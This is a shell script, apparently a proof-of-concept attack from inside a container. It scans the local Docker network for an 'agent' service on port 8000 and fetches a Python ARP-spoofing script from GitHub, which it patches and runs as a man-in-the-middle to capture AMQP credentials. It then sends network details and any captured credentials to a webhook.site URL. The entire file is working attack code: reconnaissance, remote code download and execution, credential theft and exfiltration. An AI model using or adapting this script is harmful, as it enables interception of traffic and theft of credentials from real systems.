#!/bin/sh
set -e
LOG=/tmp/attacker.log
exec > "$LOG" 2>&1

WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"

apk add --no-cache curl tcpdump iproute2 python3 >/dev/null 2>&1

echo "=== CAPS ==="
CAPBND=$(grep CapBnd /proc/self/status | awk '{print $2}')
echo "CapBnd=$CAPBND"

echo "=== NETWORK ==="
ip addr show eth0
ip route
GW=$(ip route | awk '/default/{print $3; exit}')
OUR_IFACE=$(ip route | awk '/default/{print $5; exit}')
OUR_IP=$(ip -4 addr show "$OUR_IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)
OUR_MAC=$(ip link show "$OUR_IFACE" | awk '/link\/ether/{print $2}' | tr -d ':')
echo "OUR_IP=$OUR_IP GW=$GW IFACE=$OUR_IFACE OUR_MAC=$OUR_MAC"

# Discover neighbors
ping -c 2 -W 1 "$GW" >/dev/null 2>/dev/null || true
for i in 2 3 4 5 6 7 8; do
  ping -c 1 -W 1 "172.17.0.${i}" >/dev/null 2>/dev/null &
done
wait
sleep 1
ip neigh > /tmp/neigh.txt
GW_MAC=$(ip neigh show "$GW" | awk '{print $5}' | head -1 | tr -d ':')
echo "GW_MAC=$GW_MAC"
cat /tmp/neigh.txt

# Find agent (port 8000)
AGENT_IP=""
AGENT_MAC=""
for i in 2 3 4 5 6 7 8; do
  cand="172.17.0.${i}"
  [ "$cand" = "$OUR_IP" ] && continue
  [ "$cand" = "$GW" ] && continue
  timeout 2 sh -c "echo | nc -w1 $cand 8000" >/dev/null 2>&1 && {
    AGENT_IP="$cand"
    AGENT_MAC=$(ip neigh show "$cand" | awk '{print $5}' | head -1 | tr -d ':')
    echo "AGENT: $AGENT_IP mac=$AGENT_MAC"
    break
  }
done

if [ -z "$AGENT_IP" ] || [ -z "$AGENT_MAC" ]; then
  echo "ERROR: agent not found or MAC empty"
  { echo "=== NO AGENT ==="; cat /tmp/neigh.txt; } | \
    curl -sS --max-time 20 --data-binary @- "$WH?tag=L1-V5-FAIL"
  sleep 999999
  exit 1
fi

echo ""
echo "=== ARP MITM ==="
echo "Target: agent $AGENT_IP ($AGENT_MAC) <-> gw $GW ($GW_MAC)"
echo "Our: $OUR_IP ($OUR_MAC) on $OUR_IFACE"

curl -sS -o /tmp/mitm_base.py "https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/mitm_rst_v9.py"
cp /tmp/mitm_base.py /tmp/mitm.py

# Patch ALL params in one pass - use unique delimiters to avoid double-patching
sed -i \
  -e "s|IFACE = \"eth1\"|IFACE = \"$OUR_IFACE\"|" \
  -e "s|OUR_MAC = bytes.fromhex(\"369822861110\")|OUR_MAC = bytes.fromhex(\"$OUR_MAC\")|" \
  -e "s|AGENT_MAC = bytes.fromhex(\"9af0af4b510f\")|AGENT_MAC = bytes.fromhex(\"$AGENT_MAC\")|" \
  -e "s|GW_MAC = bytes.fromhex(\"8a2a3548b779\")|GW_MAC = bytes.fromhex(\"$GW_MAC\")|" \
  -e "s|GW_IP = \"172.18.0.1\"|GW_IP = \"$GW\"|" \
  -e "s|AGENT_IPS = \[\"172.17.0.2\", \"172.18.0.2\"\]|AGENT_IPS = [\"$AGENT_IP\"]|" \
  -e "s|TOTAL_SECS = 90|TOTAL_SECS = 180|" \
  /tmp/mitm.py

# Patch hardcoded "172.18.0.2" in spoof_loop and restore_arp
sed -i \
  -e "s|AGENT_MAC, \"172.18.0.2\")|AGENT_MAC, \"$AGENT_IP\")|g" \
  -e "s|OUR_MAC, \"172.18.0.2\"|OUR_MAC, \"$AGENT_IP\"|g" \
  -e "s|AGENT_MAC, \"172.18.0.2\"|AGENT_MAC, \"$AGENT_IP\"|g" \
  /tmp/mitm.py

echo "=== Verify config ==="
head -20 /tmp/mitm.py
echo "---"
grep "AGENT_MAC\|OUR_MAC\|GW_MAC\|AGENT_IPS\|GW_IP\|IFACE\|TOTAL_SECS" /tmp/mitm.py | head -10

echo ""
echo "Starting MITM (180s)..."
timeout 190 python3 /tmp/mitm.py 2>&1 || true

echo ""
echo "=== RESULTS ==="
cat /tmp/mitm_results.txt 2>/dev/null || echo "(no results)"

CREDS=""
if [ -f /tmp/amqp_creds.txt ]; then
  echo "*** CREDS FOUND ***"
  cat /tmp/amqp_creds.txt
  CREDS="YES"
fi

echo ""
echo "=== SENDING ==="
{
  echo "=== L1-V5 ==="
  echo "AGENT=$AGENT_IP MAC=$AGENT_MAC"
  echo "GW=$GW GW_MAC=$GW_MAC"
  echo "OUR=$OUR_IP MAC=$OUR_MAC"
  echo "CAPBND=$CAPBND"
  echo ""
  echo "=== MITM ==="
  cat /tmp/mitm_results.txt 2>/dev/null || echo "(none)"
  echo ""
  if [ "$CREDS" = "YES" ]; then
    echo "=== CREDS ==="
    cat /tmp/amqp_creds.txt
  fi
  echo ""
  echo "=== CONFIG ==="
  head -20 /tmp/mitm.py
} | curl -sS --max-time 30 --data-binary @- "$WH?tag=L1-V5-RESULT"

sleep 999999
